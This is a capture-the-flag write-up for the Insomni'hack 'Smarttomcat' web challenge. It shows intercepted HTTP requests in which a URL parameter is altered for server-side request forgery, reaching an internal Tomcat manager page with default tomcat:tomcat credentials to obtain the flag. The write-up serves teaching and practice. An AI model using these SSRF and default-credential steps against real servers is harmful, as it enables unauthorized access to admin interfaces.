# Insomni'hack teaser - Smarttomcat (web 50)
For this challenge, you are supposed to enter the correct coordinates to find the robot cat.

![tomcat1](images/tomcat1.png)
![tomcat2](images/tomcat2.png)

For these types of challenges, I like using burp suite in order to record and modify HTTP requests. The following request was recorded when entering some random values.
```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 64
Connection: close

u=http://localhost:8080/index.jsp?x=875&y=-757
```

This is quite interesting, it’s sending a URL to localhost as a parameter. Judging by the name I assumed the backend software was actually running tomcat (http://tomcat.apache.org/).
I have briefly used tomcat before so I was aware that there was an admin page and that the username and password most likely was tomcat:tomcat. I found the admin URL (http://127.0.0.1/manager/html)  from google and modified the request to include the URL to the admin page.

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 64
Connection: close

u=http://127.0.0.1/manager/html
```

This caused a small little box pop up on the map informing me that I need to login using HTTP Basic Authentication. I simply updated the request once more:

```
POST /index.php HTTP/1.1
Host: smarttomcat.teaser.insomnihack.ch
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://smarttomcat.teaser.insomnihack.ch/
Content-Length: 64
Connection: close

u=http://tomcat:tomcat@127.0.0.1/manager/html
```

And the flag revealed itself: `INS{th1s_is_re4l_w0rld_pent3st}`